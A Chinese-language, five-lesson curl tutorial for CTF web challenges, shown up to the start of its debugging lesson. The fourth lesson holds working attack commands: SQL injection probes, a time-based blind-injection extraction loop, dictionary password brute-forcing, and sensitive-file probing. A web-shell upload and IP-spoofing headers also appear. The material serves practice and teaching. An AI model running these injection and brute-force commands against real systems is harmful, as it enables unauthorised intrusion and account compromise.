# tools|工具与速查手册|🧰

## [g-curl] curl 指令教程——零基础到能用：从第一个请求到 CTF 实战的完整 curl 教程（5 课），每个参数都有例子，照着抄就能跑。
### [curl-01-install] 第 1 课：curl 是什么？怎么装？第一个请求 | easy | curl;教程;安装;基础 | curl安装;curl是什么;第一个curl请求;curl指令教程;curl 教程;curl从零开始
> 零基础第 1 课：curl 是什么、怎么装、发出第一个请求、看懂一条命令

#### 这个条目的作用
一句话：curl 是一个在终端（黑窗口）里「替你去访问网址」的命令行工具。你在浏览器地址栏输入网址、按回车，浏览器会向服务器发一个 HTTP 请求，然后把服务器返回的内容渲染成网页；curl 干的是同一件事，但它**不用鼠标、不用图形界面**，全靠打字，而且它会把服务器返回的**原始内容**（HTML 源码、JSON 数据、响应头……）一字不改地打印在终端里。

为什么 CTF 里非用它不可？因为浏览器把太多东西「藏」起来了：你看到的页面是渲染后的，而漏洞利用需要看到**最原始的请求和响应**；浏览器还会自动加一堆请求头、自动跳转、自动处理 Cookie，这些「贴心」反而会挡住你看真相。curl 默认什么都不加、什么都不自动做，你让它发什么它就发什么，所以它是 Web 方向最基础、最常用、最该先学会的命令。

> [!info] 类比：浏览器是「点外卖的 App」，curl 是「直接打电话给餐厅」。App 帮你把菜单排好、图片加载好；电话里你听到的是原汁原味的声音。CTF 要的就是「原汁原味」。

#### 前置条件
- 一台电脑（Windows / Linux / macOS 都行），能打开终端（黑窗口）。
- 不用装任何开发环境，只要 curl 本身。
- 建议准备一个「靶机地址」用来练习：例如 `http://example.com`（公网示例站）或你正在打的靶机 `http://1.2.3.4:8080/`。

#### 第 1 步：确认 curl 已经装好
打开终端，输入下面这条命令，回车：
```bash
curl --version
```
预期结果：屏幕打印出 `curl 8.x.x (...) libcurl/...` 之类的版本信息。看到它，说明你的 curl 已经能用了，直接跳到第 2 步。

如果不行：
| 现象 | 原因 | 解决 |
|---|---|---|
| `'curl' 不是内部或外部命令` / `curl: command not found` | Windows 老系统没带 curl，或 Linux 没装 | Windows 10/11 自带 curl；还不行就装个 git-bash（自带 curl）；Linux 用 `sudo apt install curl`（Debian/Ubuntu）或 `sudo yum install curl`（CentOS）；macOS 自带 |
| 提示权限不足 | 当前用户没权限 | Linux/macOS 加 `sudo` 再试 |

#### 第 2 步：发出人生第一个请求
在终端里输入（`example.com` 是官方示例域名，随便访问）：
```bash
curl http://example.com
```
预期结果：终端里哗啦啦打印出一大段英文文本，开头长这样：
```html
<!doctype html>
<html>
<head>
    <title>Example Domain</title>
...
```
这就是 `example.com` 这个网页的**原始 HTML 源码**——和你在浏览器里「右键 → 查看网页源代码」看到的是同一份东西。curl 不做任何美化，源码长什么样它就打印什么样。

如果不行：
| 现象 | 原因 | 解决 |
|---|---|---|
| `curl: (6) Could not resolve host: example.com` | 域名解析失败（没联网 / DNS 有问题） | 检查网络；换 `curl http://114.114.114.114`（一个 IP，不经过域名解析）试试网络通不通 |
| `curl: (7) Failed to connect ... Connection refused` | 目标服务器没开 / 端口不对 | 靶机没启动？URL 端口写错？先确认服务在跑 |
| `curl: (28) Operation timed out` | 连接超时（网络不通或目标不响应） | 换网络 / 换目标；靶机地址确认过没 |
| 打印了一堆看不懂的乱码 | 服务器返回的是二进制或压缩内容 | 正常，第 2 课教你看懂它 |

#### 第 3 步：看懂一条命令的组成
刚才那条命令拆开看：
```txt
curl    http://example.com
└─工具名  └─目标地址（URL）
```
curl 的万能句式只有一句：
```txt
curl [参数们] 网址
```
- `curl` 是工具名，固定不变。
- `[参数们]` 是可选的一堆「开关」，以 `-` 开头（比如 `-s`、`-i`），控制「怎么发请求」，可以写一个也可以写一串，顺序无所谓。没有参数也行。
- `网址` 就是要访问的目标，**必须写在最后**（参数后面）。

#### 第 4 步：URL 长什么样？（一个网址的五个部分）
以 `http://1.2.3.4:8080/admin/login.php?user=admin&page=2#top` 为例：
| 部分 | 例子 | 意思 |
|---|---|---|
| 协议 | `http://` | 用什么方式通信。`http` / `https` 最常见；打靶机常见 `http://` |
| 域名或 IP | `1.2.3.4` | 服务器在哪。可以是 IP，也可以是 `example.com` 这种域名 |
| 端口 | `:8080` | 服务器上哪个门。**不写默认走 80（http）或 443（https）**，靶机经常用 8000/8080/8888 这种非常规端口，必须写 |
| 路径 | `/admin/login.php` | 服务器上哪个文件/接口 |
| 参数 | `?user=admin&page=2` | 问号后面是 GET 参数，`&` 分隔多个键值对，就是「我要按这个条件查询」 |
| 锚点 | `#top` | 浏览器用的「页内定位」，**服务器根本收不到**，curl 里不用管 |

#### 第 5 步：URL 什么时候要加引号？（90% 的新手栽在这里）
把网址用双引号包起来，永远没错：
```bash
curl "http://1.2.3.4:8080/?a=1&b=2"
```
必须加引号的情况：
1. **网址里有 `&`**（GET 参数不止一个时）：不加引号，终端会把 `&` 当成「后台运行」的符号，命令直接废掉。
2. **网址里有中文或空格**：终端会把空格当成「下一个参数」。
3. **网址里有 `*`、`?` 等特殊符号**：终端可能会去「通配」。

> [!tip] 养成习惯：凡是带参数的 URL 一律加双引号。多打两个引号，少踩一堆坑。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `curl: command not found` | 没装 curl | 看第 1 步的解决表 |
| `Could not resolve host` | 域名解析失败 | 查网络 / 查域名拼写 |
| `Failed to connect` | 目标没起 / 端口错 | 确认靶机与端口 |
| `Empty reply from server` | 服务器回了但没内容（或协议不对） | 试 `http://` 和 `https://`；靶机可能需要加端口 |
| 输出乱码 / 二进制 | 内容是压缩或非文本 | 之后学 `-H "Accept-Encoding: identity"`，或直接看第 2 课 |

#### 实战要点
- **先 `curl --version` 确认能用**，再开始练，别在「工具没装好」上浪费时间。
- 第一次跑通一个请求后，把它和浏览器地址栏对照着看：地址栏输入的网址 = curl 里的 URL。
- 参数不熟没关系，第 2 课开始逐个学；**记不住参数名就记住这条句式：`curl [参数们] 网址`**。
### [curl-02-basic] 第 2 课：最常用参数速查（每个都带例子） | easy | curl;参数;速查;常用参数 | curl参数;curl -s;curl -i;curl -I;curl -L;curl -k;curl -o;curl -v;curl参数大全;curl flags
> curl 最常用的 15 个参数逐个讲透：-s -i -I -o -O -L -k -v -X -d -H -b -c -u -m -w，每个都带例子和预期输出

#### 这个条目的作用
参数（也叫选项/flag）就是给 curl 的「开关」，写在 `curl` 和网址之间，控制请求怎么做。本课把**最常用的 15 个**逐个讲透，每个都给例子和「输出长什么样」。学完这一课，日常 90% 的 curl 用法你就都会了。

先记住两条规律：
1. **参数写在 `curl` 和网址之间**：`curl -s -i http://x` 这种。
2. **短参数可以连写**：`curl -s -i` 可以写成 `curl -si`（个别例外，下面会标）。

#### 前置条件
- 能跑通第 1 课的 `curl http://example.com`。
- 一个终端 + 一个能访问的网址（继续用 `http://example.com` 或靶机地址都行）。

#### 第 1 步：两个「安静」参数：-s 和 -S
```bash
curl -s http://example.com
```
`-s` = silent（静默）：把进度条和一切「过程提示」都关掉，**只输出服务器返回的内容**。不加 `-s` 时 curl 会在终端里显示一个下载进度条，内容一多屏幕就花了，所以**脚本和复制粘贴时永远带上 `-s`**。

`-S` = show-error：单独用没意义，必须和 `-s` 配合：
```bash
curl -sS http://example.com
```
含义：静默 + 但出错时把错误信息显示出来。平时推荐直接写 `-sS` 两个一起上：正常时干净，出错时不至于一脸懵。

预期结果：两种写法都只打印网页源码，干净利落。
如果不行：没有输出且没报错 → 试试 `curl -sS -v http://example.com`（`-v` 本课第 6 步讲），看它到底连没连上。

#### 第 2 步：看响应头和响应体：-i 和 -I
服务器回应你时，分两部分：**响应头**（一堆 `Key: Value` 的说明信息）和**响应体**（真正的内容）。
```bash
curl -i http://example.com
```
`-i` = include：把**响应头 + 响应体**一起打印出来。响应头长这样：
```txt
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Date: ...
```
预期结果：最上面几行是响应头，空一行之后是网页源码（响应体）。
如果不行：只想看头不想看体 → 用 `-I`。

```bash
curl -I http://example.com
```
`-I` = head：只发送一个 HEAD 请求，**只拿响应头，不拿内容**。常用于快速探测：目标存不存在、什么状态码、什么服务器（nginx/apache）、响应头里有没有奇怪的东西。
预期结果：只打印那几行响应头，没有正文。
如果不行：有些服务器不支持 HEAD（少见），返回空或错误，改用 `-i` 自己看。

> [!tip] 信息收集三板斧：`curl -I http://target/`（看头）→ `curl -s http://target/robots.txt`（看敏感文件）→ `curl -s http://target/ | grep -i "关键字"`（在源码里搜东西）。`-i` 是 CTF 里用得最多的参数之一。

#### 第 3 步：保存和下载：-o 与 -O
```bash
curl -s -o out.html http://example.com
```
`-o 文件名` = output：把响应体**存进文件**，而不是打印到屏幕（`-s` 静默后屏幕更干净）。想慢慢看下载的内容时最常用：先 `-o` 存下来再看。
预期结果：终端无输出，当前目录多了个 `out.html` 文件，`cat out.html` 能看到内容。

```bash
curl -s -O http://example.com/backup.zip
```
`-O`（大写）= remote-name：按服务器给的文件名**原样保存**。URL 里文件名是啥，存下来就叫啥（这里是 `backup.zip`）。
预期结果：当前目录出现 `backup.zip`。
如果不行：`curl: (22) The requested URL returned error: 404` → 文件不存在或路径写错，先 `-I` 探一下。

#### 第 4 步：跟着跳转走：-L
有些网址访问后会「重定向」（服务器说：你要的东西在别处，去 `/login`）。默认情况下 **curl 不跟**，只把「去别处」的提示返回给你：
```bash
curl -s http://example.com/redirect   # 假如这个地址会跳转
```
预期结果：返回的可能是一小段空 HTML 或 301/302 提示，而不是最终页面。
加上 `-L`（location）让它自动跟着跳：
```bash
curl -sL http://example.com/redirect
```
`-L` = location：自动跟随所有重定向，直到拿到最终内容。登录后跳转、短链接、http 跳 https 都要靠它。
预期结果：直接看到最终页面的内容。

#### 第 5 步：跳过 HTTPS 证书检查：-k
访问 https 网站时 curl 会检查它的证书，证书有问题（自签名、过期、靶机常见）就会拒绝连接：
```bash
curl -s https://target.example/   # 可能报证书错误
curl -sk https://target.example/  # 跳过证书检查
```
`-k` = insecure：**不检查服务器证书**。CTF 靶机几乎全是自签名证书，所以 `-sk` 组合在打靶时出场率极高。
预期结果：`-sk` 能正常返回内容，而裸 `-s` 报 `SSL certificate problem`。
如果不行：还报 SSL 错误 → 看第 5 课排错表（可能还涉及 TLS 版本，加 `--tlsv1.2` 试试）。

#### 第 6 步：全程直播：-v
```bash
curl -v http://example.com
```
`-v` = verbose（啰嗦）：把**整个通信过程**打印出来——连接了哪个 IP、发了哪些请求头、收到哪些响应头。这是分析问题、理解 HTTP 的万能钥匙，第 5 课会逐行拆解，本课先认识它。
预期结果：输出里出现很多以 `*`、`>`、`<` 开头的行（`>` 是你发出去的，`<` 是服务器回过来的）。

#### 常用参数总表（背这张就够）
| 参数 | 全称含义 | 作用 | 最常用例子 |
|---|---|---|---|
| `-s` | silent | 关掉进度条等废话，只输出内容 | `curl -s http://x` |
| `-S` | show-error | 配 `-s` 用，出错时显示错误 | `curl -sS http://x` |
| `-i` | include | 输出带响应头 | `curl -si http://x` |
| `-I` | head | 只发 HEAD 请求拿响应头 | `curl -I http://x` |
| `-o 文件` | output | 把响应体存成文件 | `curl -s -o a.html http://x` |
| `-O` | remote-name | 按 URL 里的文件名保存 | `curl -sO http://x/backup.zip` |
| `-L` | location | 自动跟随重定向 | `curl -sL http://x` |
| `-k` | insecure | 跳过 HTTPS 证书检查 | `curl -sk https://x` |
| `-v` | verbose | 打印完整通信过程 | `curl -v http://x` |
| `-X 方法` | request | 指定请求方法（GET/POST/PUT…） | `curl -X POST http://x` |
| `-d 数据` | data | 发送表单数据（自动变 POST） | `curl -d "a=1" http://x` |
| `-H 头` | header | 自定义请求头 | `curl -H "Cookie: a=1" http://x` |
| `-b 内容` | cookie | 携带 Cookie | `curl -b "PHPSESSID=abc" http://x` |
| `-c 文件` | cookie-jar | 把收到的 Cookie 存进文件 | `curl -c cookies.txt http://x` |
| `-u 账号:密码` | user | 基本认证（Basic Auth） | `curl -u admin:123 http://x` |
| `-m 秒数` | max-time | 总超时时间（秒），防止卡死 | `curl -m 5 http://x` |
| `-w 格式` | write-out | 输出结束后打印指定信息 | `curl -s -o /dev/null -w "%{http_code}" http://x` |
| `-x 代理` | proxy | 走代理（挂 Burp 用） | `curl -x http://127.0.0.1:8080 http://x` |

（`-X`、`-d`、`-H`、`-b`、`-c` 会在第 3 课实战展开；`-w`、`-x` 在第 5 课展开。）

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 没加 `-s` 时屏幕有进度条 | 正常现象 | 加 `-s` |
| `-i` 和 `-I` 记混 | 一个拿「头+体」，一个只拿「头」 | `-i` 小写 i 是 include（全都要）；`-I` 大写 I 是 head（只要头） |
| `curl: option -X: ...` 拼写错误 | 参数写错 | 参数严格区分大小写：`-i` ≠ `-I`，`-o` ≠ `-O` |
| 下载的文件是 HTML 而不是想要的文件 | 服务器返回了错误页 | `cat 文件` 看看内容，多半是 404 页面 |

#### 实战要点
- **打靶默认起手：`curl -sk` + `-i`**，一条命令看清状态码、响应头和内容：`curl -ski http://target/`。
- 参数顺序无所谓，`curl -s -i` 和 `curl -i -s` 完全一样。
- 背参数总表比背任何教程都值：做题时扫一眼表格就能拼出想要的命令。
### [curl-03-post] 第 3 课：POST 与数据提交（表单、JSON、上传、请求头） | easy | curl;POST;请求头;Cookie;上传;数据提交 | curl post;curl -d;curl -H;curl 表单;curl json;curl cookie;curl 登录;curl -F;curl -b;curl -c;curl 上传
> POST 请求完整实战：表单提交、JSON 接口、请求头、Cookie 会话模拟登录、文件上传，最后串成「登录→拿 flag」完整流程

#### 这个条目的作用
前面两课发的是 GET 请求（把信息放在网址里问服务器要东西）。但 CTF 里大量操作是**提交数据**：登录、发评论、打接口、传参数——这些都靠 POST 请求（把数据放在请求的「身体」里发给服务器）。本课教你用 curl 发 POST、传表单、传 JSON、带 Cookie 模拟登录、上传文件，全是打靶刚需。

先理解 GET 和 POST 的区别：
| 对比 | GET | POST |
|---|---|---|
| 数据放哪 | URL 的参数里（`?a=1&b=2`） | 请求体里（URL 干干净净） |
| 看得见吗 | 网址栏全暴露 | 网址栏看不见，在请求体里 |
| 典型用途 | 查资料、看页面 | 登录、提交、上传、改数据 |
| 长度限制 | 短（URL 有长度限制） | 长（可以传文件） |

> [!info] 记法：GET = 「去要」（Get），POST = 「寄出去」（Post）。你要「寄」点东西给服务器，就用 POST。

#### 前置条件
- 会第 1、2 课的 `curl -s` 基础用法。
- 一个可以提交数据的练习目标：登录页（如靶机的 `/login.php`）、任意一个提交表单的页面。
- 会看第 2 课参数总表里的 `-X` / `-d` / `-H` / `-b` / `-c`。

#### 第 1 步：最基础的 POST：-d
```bash
curl -X POST http://target/login.php -d "username=admin&password=123456"
```
拆解：
- `-X POST`：明确告诉 curl 用 POST 方法。
- `-d "username=admin&password=123456"`：要发送的数据，格式和 URL 参数一样（`键=值&键=值`），**会自动加上 `Content-Type: application/x-www-form-urlencoded` 请求头**——这是网页表单的默认格式，90% 的登录框都用它。

预期结果：服务器返回登录成功/失败的页面内容。
如果不行：返回 405 Method Not Allowed → 这个接口不接受 POST，试试 GET；返回空/错误 → 参数名可能不对（`username` 也许叫 `user`/`name`，看源码或抓包确认）。

> [!tip] 有个偷懒点：只要写了 `-d`，curl 就**自动当成 POST**，`-X POST` 可以省略：`curl -d "a=1" http://x` 就是 POST。但有些题目/服务器对方法敏感，所以建议新手还是把 `-X POST` 写上，显式、不会错。

#### 第 2 步：数据里有特殊字符？用 --data-urlencode
如果数据里有中文、空格、`&`、`=` 等字符，直接塞进 `-d` 里可能被理解错（比如密码里带 `&`，会被当成「两个参数」）。安全的做法是让 curl 帮你编码：
```bash
curl -X POST http://target/login.php --data-urlencode "username=admin" --data-urlencode "password=p@ss&word"
```
`--data-urlencode "键=值"`：自动把值做 URL 编码后再发送。
预期结果：服务器收到的密码是完整的 `p@ss&word`，而不是被 `&` 拆开。
如果不行：接口要求别的字段名，对照源码/抓包改键名。

#### 第 3 步：发 JSON 数据：-H + -d 组合
很多新一点的接口（尤其是 API）用 JSON 格式收发数据，此时必须手动指定 `Content-Type: application/json`，否则服务器看不懂你发的格式：
```bash
curl -X POST http://target/api/login -H "Content-Type: application/json" -d '{"username":"admin","password":"123456"}'
```
拆解：
- `-H "Content-Type: application/json"`：告诉服务器「我发的身体是 JSON」。
- `-d '{"username":"admin",...}'`：数据本身写成 JSON 字符串（键和值都要双引号，外层用**单引号**包住，这样里面的双引号不用转义）。

预期结果：接口返回 JSON（`{"code":200,...}`）或按接口逻辑响应。
如果不行：返回 400/415 → 请求头 Content-Type 不对或 JSON 格式错（少逗号、多引号）；返回 500 → 参数名/类型和接口对不上。

> [!warn] 在 Windows 的 cmd 里，单引号 `'` 不是字符串定界符，JSON 里的双引号要写成 `\"`：`curl -d "{\"a\":\"b\"}" ...`。Linux/macOS 的 bash 里用单引号最省事。要是嫌转义烦，先把 JSON 存进文件再发：`curl -d @data.json -H "Content-Type: application/json" http://x`（`@文件名` 表示从文件读数据）。

#### 第 4 步：带请求头：-H 详解
`-H` 可以加任意请求头，写多个就多写几个 `-H`：
```bash
curl -s http://target/admin/ -H "Cookie: PHPSESSID=abc123" -H "X-Forwarded-For: 127.0.0.1" -H "Referer: http://target/admin/"
```
常用场景：
| 请求头 | 用途 | 例子 |
|---|---|---|
| `Cookie: ...` | 带上登录态/会话 | `-H "Cookie: PHPSESSID=abc123"`（等价于 `-b`） |
| `User-Agent: ...` | 伪装浏览器/绕过 UA 检测 | `-H "User-Agent: Mozilla/5.0 ..."`（默认会暴露是 curl） |
| `Referer: ...` | 伪造来源页（防盗链、CSRF 校验） | `-H "Referer: http://target/index.php"` |
| `X-Forwarded-For: ...` | 伪造来源 IP（绕 IP 限制） | `-H "X-Forwarded-For: 127.0.0.1"` |
| `Content-Type: ...` | 声明请求体格式 | `-H "Content-Type: application/json"` |
| `Authorization: ...` | 带 token（JWT 等） | `-H "Authorization: Bearer eyJhbGciOi..."` |

预期结果：服务器把你当「带权限/带伪装」的请求处理。
如果不行：还是 403/跳登录 → 服务端可能校验了别的头（Origin、Sec-*），用 Burp 抓一次正常浏览器的请求对比着抄。

#### 第 5 步：Cookie 会话：-c 存、-b 带（模拟登录）
登录类题目的标准流程：先 POST 登录拿 Cookie → 再带 Cookie 访问需要登录才能看的页面。curl 用两个参数配合：
```bash
# 1) 登录，把服务器发来的 Cookie 存进 cookies.txt
curl -s -c cookies.txt -X POST http://target/login.php -d "username=admin&password=123456"

# 2) 带 Cookie 访问需要登录态的页面
curl -s -b cookies.txt http://target/flag.php
```
- `-c cookies.txt`：cookie-jar，把服务器 `Set-Cookie` 的头**保存**到文件。
- `-b cookies.txt`：把这个文件里的 Cookie 原样**带上**。

预期结果：第 2 步能访问到未登录时 403/跳转的页面。
如果不行：登录没成功（看第 1 步的排查）→ Cookie 文件是空的，`cat cookies.txt` 确认；有些题 Cookie 值不固定或还有别的校验，配合 `-v` 观察。

也可以不存文件，直接手写 Cookie：
```bash
curl -s http://target/flag.php -b "PHPSESSID=abc123; admin=1"
```
`-b "键=值; 键=值"`：直接带一串 Cookie，多个用 `;` 分隔（和浏览器里的 Cookie 写法一样）。当你从别的途径（Burp、源码）拿到了 Cookie 值，就用这种。

#### 第 6 步：上传文件：-F
```bash
curl -X POST http://target/upload.php -F "file=@/home/user/shell.php"
```
`-F "字段名=@本地文件路径"`：以 `multipart/form-data` 格式（网页上传文件的格式）发送，`@` 后面跟本地文件路径，文件内容会被读进去。
预期结果：服务器按上传逻辑响应（成功/失败提示）。
如果不行：上传报错 → 字段名不对（是 `file` 还是 `upload`？看表单源码）；文件被过滤 → 那是题目的 WAF 逻辑，属于「文件上传」专题的内容。

#### 第 7 步：完整实战：登录 → 带会话 → 拿 flag
把上面串成一个真实流程（假设靶机 `http://10.0.0.5:8080/`，登录接口 `/api/login`，需要登录的接口 `/api/flag`）：
```bash
# 1) 登录并保存 Cookie（JSON 接口）
curl -s -c ck.txt -X POST http://10.0.0.5:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"123456"}'

# 2) 带 Cookie 请求 flag 接口
curl -s -b ck.txt http://10.0.0.5:8080/api/flag
```
预期结果：第 1 步返回 `{"code":200,...}` 之类的成功信息并生成 `ck.txt`；第 2 步返回包含 flag 的数据。
如果不行：第 1 步没成功 → 检查参数名/Content-Type/密码；第 1 步成功但第 2 步还 401/403 → 服务端可能不认 Cookie 文件里的格式，或需要额外请求头，用 `curl -v -b ck.txt` 对比浏览器请求慢慢找差异。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 写了 `-d` 还是 GET | 记错写法 | 写了 `-d` 就会自动 POST；显式加 `-X POST` 更稳 |
| 中文变成乱码 | 没做 URL 编码 | 用 `--data-urlencode` |
| JSON 接口报 400 | Content-Type 不是 application/json 或 JSON 语法错 | 加 `-H "Content-Type: application/json"`；检查引号配对 |
| 登录成功但访问不了 | Cookie 没带上/没存上 | `-b` 带上；`-c` 存了没有；`cat ck.txt` 检查 |
| 上传 500 | 字段名或文件路径错 | 字段名对照表单；`@` 路径写全 |
| 密码里有 `&` 结果登录失败 | `&` 被当成参数分隔 | `--data-urlencode` 或对值做 URL 编码 |

#### 实战要点
- **万能登录流程**：`-c` 存 Cookie → `-b` 带 Cookie，两步走，CTF 里至少一半的题用得上。
- `-H` 是「加戏」工具：绕过 UA 检测、伪造 IP、带 token，全靠它，做题时缺什么头就加什么头。
- 不会的参数名没关系：**用 Burp 抓一次浏览器的正常请求，右键 → Copy as curl command，能一键生成 curl 命令**，照着改就行。
- 大批量提交（爆破、遍历）别手打，配合 for 循环，见第 4 课。
### [curl-04-ctf] 第 4 课：CTF 打靶实战场景汇总 | medium | curl;CTF;实战;打靶;爆破;盲注;信息收集 | curl 打靶;curl 实战;curl 爆破;curl 盲注;curl 时间盲注;curl 下载;curl 代理;curl 登录
> 8 个打靶直接能抄的场景：信息收集四连、登录拿 Cookie、SQL 注入手测、时间盲注计时、循环爆破、下载源码、挂 Burp 代理、--resolve 直连内网

#### 这个条目的作用
前 3 课学了招式，本课把它们组合成**打靶时直接能抄的场景命令**。每个场景给「目的 → 命令 → 怎么看结果」，覆盖信息收集、登录态、注入手测、时间盲注、爆破、下载、代理转发等 CTF 高频动作。看到题目就翻对应场景，照抄改 URL 就能用。

> [!info] 通用约定：下面所有命令里，`target` 都换成你的靶机地址（如 `http://1.2.3.4:8080`）。打靶默认加 `-sk`（静默+跳过证书），需要看头时再加 `-i`。

#### 场景 1：信息收集四连（起手式）
```bash
# 响应头 + 状态码（一眼看出服务器类型、技术栈）
curl -ski http://target/

# robots.txt（经常藏着后台路径）
curl -sk http://target/robots.txt

# 常见敏感文件
curl -sk http://target/.git/config
curl -sk http://target/backup.zip
curl -sk http://target/flag.php

# 在页面源码里搜关键词
curl -sk http://target/ | grep -iE "flag|admin|password|token|<!--"
```
预期结果：响应头暴露 nginx/php 版本；robots.txt 给出 Disallow 路径；源码注释里直接有提示。
如果不行：404 是常态，别一个个死磕，换工具批量扫目录（见知识库「目录扫描」条目）。

#### 场景 2：登录 → 带 Cookie → 拿数据（最常见流程）
```bash
# 登录并保存会话
curl -sk -c ck.txt -X POST http://target/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"123456"}'

# 带会话访问
curl -sk -b ck.txt http://target/api/flag

# 或者直接手写 Cookie（比如从源码/抓包拿到的 admin=1）
curl -sk http://target/admin/ -b "admin=1; PHPSESSID=abc"
```
预期结果：第二步拿到登录后才可见的数据。
如果不行：先 `cat ck.txt` 看 Cookie 存没存上；再 `curl -v -b ck.txt` 对比浏览器请求。

#### 场景 3：SQL 注入手测（配合 URL 编码）
```bash
# 探测：加单引号看是否报错/行为变化
curl -sk "http://target/?id=1'"
# 布尔判断：真条件 vs 假条件页面是否不同
curl -sk "http://target/?id=1 AND 1=1"
curl -sk "http://target/?id=1 AND 1=2"
# 时间盲注探测：sleep 一下看是否延迟（-m 防卡死）
curl -sk -m 10 "http://target/?id=1 AND sleep(5)"
```
预期结果：`1'` 报错或行为异常说明有注入点；真/假条件页面不同说明布尔注入成立；sleep 请求明显变慢说明时间盲注成立。
如果不行：空格被过滤 → 用 `/**/` 或 `%09` 等替换（见知识库「SQL 过滤绕过」条目）；参数名不对 → 翻源码确认是 `id` 还是别的。
注意：`AND` 里的空格在 URL 里可以原样发，但有些 WAF/解析器敏感，稳妥起见把空格编码成 `%20`。

#### 场景 4：时间盲注计时（-w 输出耗时）
盲注判断「成立/不成立」最精确的方式是**测响应耗时**，curl 的 `-w` 能直接打印用时：
```bash
# 打印这次请求花了多少秒（-o /dev/null 表示丢弃内容只留计时）
curl -s -o /dev/null -w "%{time_total}\n" "http://target/?id=1 AND sleep(5)"
# 正常请求的基准耗时
curl -s -o /dev/null -w "%{time_total}\n" "http://target/?id=1"
```
预期结果：第一条输出接近 `5.00`（睡了 5 秒），第二条输出 `0.0x`。耗时差 5 秒 = 注入成立。
如果不行：两条都是 0.0x → sleep 没执行（可能被过滤/参数没进 SQL）；两条都很慢 → 网络慢，先测基准值再说。
再配合 bash 循环就能逐字符盲注取数（把 `substr(...)` 里的猜测逻辑换掉）：
```bash
for c in $(seq 32 126); do
  t=$(curl -s -o /dev/null -w "%{time_total}" "http://target/?id=1 AND if(ascii(substr(database(),1,1))=$c,sleep(2),0)")
  echo "$c -> $t"
done | sort -t'>' -k2 -rn | head -1
```
预期结果：耗时最长的那行对应的数字，就是 database() 第一个字符的 ASCII 码。
（更省事：直接上 sqlmap，本知识库有 sqlmap 条目。手测只是为了确认注入点存在。）

#### 场景 5：一句话爆破（循环 + 字典）
```bash
# 弱口令爆破登录接口（字典文件 pass.txt，每行一个密码）
while read p; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://target/login.php -d "user=admin&pass=$p")
  echo "$p -> $code"
done < pass.txt

# 如果登录成功会跳转到别的页面，判断条件改成 grep 关键字：
while read p; do
  if curl -s -X POST http://target/login.php -d "user=admin&pass=$p" | grep -q "welcome"; then
    echo "FOUND: $p"
    break
  fi
done < pass.txt
```
预期结果：某个密码返回的状态码/页面内容与众不同，就是正确答案。
如果不行：登录接口有验证码/频率限制 → 换 Hydra 或 Burp Intruder（知识库有专门条目）；判断关键字找不准 → 先用浏览器登录一次成功，记下成功页面的独有字符串。

#### 场景 6：下载文件与源码备份
```bash
# 按原文件名下载（备份文件泄露的经典动作）
curl -skO http://target/backup.zip
curl -skO http://target/index.php.bak
# 改名保存（源码泄露：把 .php 当文本读）
curl -sk -o index.txt http://target/index.php
# 断点续传大文件（-C - 表示从上次进度继续）
curl -sk -C - -O http://target/big.zip
```
预期结果：文件落地，`file backup.zip` 或 `cat index.txt` 确认内容。
如果不行：404 → 文件不存在或路径要 fuzz；下载下来是 HTML → 服务器拦了，`cat` 看是啥错误页。

#### 场景 7：挂代理看流量（配合 Burp）
本地开着 Burp（默认监听 127.0.0.1:8080）时，让 curl 走代理，Burp 里就能看到完整请求，方便改包重放：
```bash
curl -sk -x http://127.0.0.1:8080 "http://target/?id=1"
```
预期结果：Burp 的 HTTP history 里出现这条请求，可以右键 Repeater/改包。
如果不行：Burp 没开或端口不是 8080 → 改 `-x http://127.0.0.1:端口`；https 目标报证书错 → 加 `-k`（Burp 的 CA 证书没导入时）。

#### 场景 8：SSRF / 直连内网（--resolve 与 Host 头）
题目给了域名但服务器在内网、或需要指定 Host 时：
```bash
# 强制解析到指定 IP（绕过 DNS，让请求发给 127.0.0.1）
curl -sk --resolve target:80:127.0.0.1 http://target/
# 只改 Host 头（服务器按 Host 路由）
curl -sk http://127.0.0.1/ -H "Host: target"
```
预期结果：请求实际打到了你指定的 IP/端口，服务器按 Host 内容响应。
如果不行：`--resolve` 的格式是 `域名:端口:IP`，端口写错就无效；Host 头被校验就和服务器配置有关，慢慢对。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 所有请求都 403/429 | 频率太高 / 被 WAF 拦 | 加 `-m` 限速、换 UA（`-H "User-Agent: Mozilla/5.0"`）、降低频率 |
| 中文参数乱码 | 没 URL 编码 | `--data-urlencode` |
| 循环脚本卡死 | 有请求一直不返回 | 每条 curl 都加 `-m 5` |
| 下载下来是 404 页面 | 文件不存在 | 先 `curl -I` 探测，或换路径 |
| `%{time_total}` 输出的是字面量 | 写错位置 | 确认写在 `-w "..."` 里，且用了 `-o /dev/null` |

#### 实战要点
- **所有场景都能脚本化**：一条 curl 手测，确认后立刻用 for/while 循环批量跑，效率和正确率都翻倍。
- 记住「三步走」：**手测（curl）→ 确认现象 → 批量（循环）**。
- 拿不准参数就 `-v` 看全过程，再对比 Burp 里浏览器发的正常请求。
- 这些命令都是「搬运工」，真正决定打法的是你对漏洞原理的理解——curl 只是让你把想法变成请求。
### [curl-05-debug] 第 5 课：调试与排错（-v / -w 与报错速查表） | easy | curl;调试;排错;-v;-w;报错;代理 | curl -v;curl -w;curl 报错;curl 超时;curl 证书;curl 排错;curl 代理;curl ssl;curl 状态码
> 学会 -v 逐行读通信过程、-w 精确取数（状态码/耗时/大小）、常见报错编号速查表，自己就能排查 90% 的 curl 问题

#### 这个条目的作用
「我明明照着抄了，为什么不出结果？」——本课解决这个问题。学会 `-v` 逐行读通信过程、`-w` 精确取数、以及常见报错的快速判断，你就能自己排查 90% 的 curl 问题，不再瞎试。

#### 前置条件
- 会第 1、2 课的参数（尤其是 `-v`）。
- 一个能正常访问的网址（如 `http://example.com`）用来对照「正常长什么样」。

#### 第 1 步：-v 输出逐行读
```bash
curl -v http://example.com
```
输出分三类行，用行首符号区分：
| 行首 | 含义 | 例子 |
|---|---|---|
| `*` | 连接层面的过程信息 | `* Trying 93.184.215.14:80...`（正在连这个 IP） |
